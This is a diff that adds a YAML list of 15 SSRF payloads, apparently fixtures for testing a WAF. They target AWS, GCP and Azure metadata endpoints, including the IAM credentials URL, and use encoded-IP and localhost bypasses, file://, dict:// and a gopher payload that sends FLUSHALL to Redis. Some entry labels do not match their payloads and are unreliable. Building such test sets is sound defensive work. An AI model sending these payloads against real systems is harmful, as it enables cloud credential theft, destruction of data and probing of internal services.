@@ -1,0 +1,107 @@
+# SSRF — 15 entries. Cloud metadata + localhost + scheme-confusion payloads.
+# WAF-view only. Sources: PayloadsAllTheThings/SSRF, HackTricks/SSRF-Cloud.
+
+- id: ssrf-aws-meta
+  class: ssrf
+  payload: "http://169.254.169.254/latest/meta-data/"
+  trigger: &T200 { kind: status, code: 200 }
+  cwe: CWE-918
+  source: "PayloadsAllTheThings — AWS metadata"
+
+- id: ssrf-aws-iam
+  class: ssrf
+  payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+  trigger: *T200
+  cwe: CWE-918
+  source: "Classic AWS role-credentials URL"
+
+- id: ssrf-gcp-meta
+  class: ssrf
+  payload: "http://metadata.google.internal/computeMetadata/v1/"
+  trigger: *T200
+  cwe: CWE-918
+  source: "HackTricks — GCP metadata"
+
+- id: ssrf-azure-meta
+  class: ssrf
+  payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+  trigger: *T200
+  cwe: CWE-918
+  source: "Azure IMDS endpoint"
+
+- id: ssrf-decimal-ip
+  class: ssrf
+  payload: "http://2852039166/"                          # 169.254.169.254 decimal
+  trigger: *T200
+  cwe: CWE-918
+  source: "jhaddix — decimal IP bypass"
+
+- id: ssrf-hex-ip
+  class: ssrf
+  payload: "http://0xa9fea9fe/latest/meta-data/"         # same IP in hex
+  trigger: *T200
+  cwe: CWE-918
+  source: "jhaddix — hex IP bypass"
+
+- id: ssrf-localhost-shorthand
+  class: ssrf
+  payload: "http://127.1/admin"
+  trigger: *T200
+  cwe: CWE-918
+  source: "Common WAF bypass — shorthand IP"
+
+- id: ssrf-localhost-zero
+  class: ssrf
+  payload: "http://0.0.0.0/admin"
+  trigger: *T200
+  cwe: CWE-918
+  source: "Unspecified-address bypass"
+
+- id: ssrf-ipv6-loopback
+  class: ssrf
+  payload: "http://[::]/admin"
+  trigger: *T200
+  cwe: CWE-918
+  source: "IPv6 loopback shorthand"
+
+- id: ssrf-file-proto
+  class: ssrf
+  payload: "file:///etc/hostname"
+  trigger: *T200
+  cwe: CWE-918
+  source: "PayloadsAllTheThings — file:// scheme"
+
+- id: ssrf-gopher-redis
+  class: ssrf
+  payload: "gopher://127.0.0.1:6379/_FLUSHALL%0d%0aQUIT"
+  trigger: *T200
+  cwe: CWE-918
+  source: "SSRF-to-Redis via gopher"
+
+- id: ssrf-dict
+  class: ssrf
+  payload: "dict://127.0.0.1:11211/stat"
+  trigger: *T200
+  cwe: CWE-918
+  source: "Memcached enum via dict://"
+
+- id: ssrf-dnsrebind
+  class: ssrf
+  payload: "http://169.254.169.254.nip.io/"
+  trigger: *T200
+  cwe: CWE-918
+  source: "nip.io DNS rebinding"
+
+- id: ssrf-imdsv2-token
+  class: ssrf
+  payload: "http://169.254.169.254/latest/api/token"
+  trigger: *T200
+  cwe: CWE-918
+  source: "AWS IMDSv2 token request"
+
+- id: ssrf-redirect-chain
+  class: ssrf
+  payload: "http://127.0.0.1:22"
+  trigger: *T200
+  cwe: CWE-918
+  source: "Port-scan style probe to internal SSH"
